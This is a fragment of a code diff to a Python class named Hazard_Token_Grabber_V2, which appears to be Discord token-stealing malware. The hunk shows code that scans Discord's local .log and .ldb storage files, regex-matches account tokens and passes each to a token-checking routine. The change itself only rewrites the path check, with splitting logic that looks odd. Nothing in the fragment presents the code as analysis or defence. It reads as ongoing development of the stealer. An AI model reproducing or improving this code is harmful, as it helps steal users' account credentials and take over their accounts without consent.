@@ -281,7 +281,7 @@ class Hazard_Token_Grabber_V2(functions):
                             for token in findall(regex, line):
                                 asyncio.run(self.checkToken(token))
             else:
-                if os.path.exists(self.roaming+'\\discord\\Local State'):
+                if os.path.exists(self.roaming + path.split("\\")[1].split("\\")[0]):
                     for file_name in os.listdir(path):
                         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                             continue
